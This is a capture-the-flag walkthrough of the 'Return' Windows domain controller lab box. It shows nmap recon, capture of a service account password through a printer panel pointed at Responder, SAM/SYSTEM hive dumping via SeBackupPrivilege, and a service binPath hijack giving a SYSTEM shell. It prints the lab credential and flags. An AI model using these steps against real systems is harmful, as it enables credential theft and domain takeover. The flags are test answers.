
# CTF Writeup: Return

---
## Reconnaissance

An initial scan revealed the running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.95.241                                                                                
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-20 06:55 -0500
Nmap scan report for 10.129.95.241
Host is up (0.051s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49681/tcp open  unknown
49694/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 44.90 seconds
```

Another more detailled scan revealed further information about the running services.

```
nmap -n -Pn -sSCV -p 53,80,88,135,139,489,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49678,49681,49694 10.129.95.241 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-20 06:58 -0500
Nmap scan report for 10.129.95.241
Host is up (0.048s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-20 12:17:41Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
489/tcp   closed nest-protocol
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open   msrpc         Microsoft Windows RPC
49678/tcp open   msrpc         Microsoft Windows RPC
49681/tcp open   msrpc         Microsoft Windows RPC
49694/tcp open   msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-20T12:18:31
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 18m36s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.80 seconds
```

The nmap scan revealed the domain name "return.local" and the target itself seems to be an Domain Controller. There is also an webpage running on port 80 called "HTB Printer Admin Panel".

Let's proceed with mapping the domain "return.local" to our target ip in our local dns file.

I verifed that the webpage itself is an Admin Panel and yes. I am immediatly inside it, there is no user account functionality or login panel. The "Settings" Tab reveals interesting information about an subdomain and an service account. The password itself is just 7x "*"

```
printer.return.local
svc-printer
*******
```

There is also an "Update" Button, let's analyze it with BurpSuite.

The functionality is rather interesting since there is an "ip" variable. Which we could later use for potential SSRF.

![](Pasted%20image%2020260620141350.png)

I decided to map the retrieved subdomain to our target ip in our local dns file.

```
mousepad /etc/hosts
```

After trying to get shares, local accounts or domain accounts with nxc as guest and anonymous user I failed. 

So I came back to the potential SSRF thingy. I set up my responder.

```
responder -I tun0
```

After prompting my IP I gained the plaintext password of the service account user.

```
ip=10.10.15.9
```

```
svc-printer:1edFg43012!!
```

I tried to evil-winrm into the target system using the retrieved credentials but I wasn't able to find anything.

I then sprayed the credentials against winrm and I was able to pwn it. Which means we should be able to connect. Let's test it again.

I restarted the machine and it worked!

```
evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'
```

Retrieved user.txt in C:\Users\svc-printer\Desktop

```
109df1dea0343d7e169dcebf1303ed5d
```

The Service Account seems to be having a lot of privileges open. I will utilize "SeBackupPrivilege" to escalate privileges. Although there is other posibilities aswell.

It allows us to retrieve the SAM & SYSTEM File out of the registry. We can use these files to dump the NTLM Hashes of all local accounts. 

```
reg save hklm\sam C:\Temp\SAM
reg save hklm\system C:\Temp\SYSTEM
```

I then proceeded with downloading those files.

```
download SAM
download SYSTEM
```

and dumped them using impacket-secretsdump

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
```

It worked, but I wasn't able to connect as Administrator. Which was rather odd.

So I utilized another priv esc "Server Operator".

Add current session to Administrator Group.

```
sc.exe config vss binPath= "C:\WINDOWS\system32\cmd.exe /c net localgroup Administrators svc-printer /add"
```

Stop Service

```
sc.exe stop vss
```

Start Service

```
sc.exe start vss
```

Check if session is in Administrators Group

```
net localgroup administrators
```

We can now utilize psexec to spawn a SYSTEM Shell.

```
impacket-psexec svc-printer:'1edFg43012!!'@return.local
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
9547de65ef7db8ad8a03cde1e58d6470
```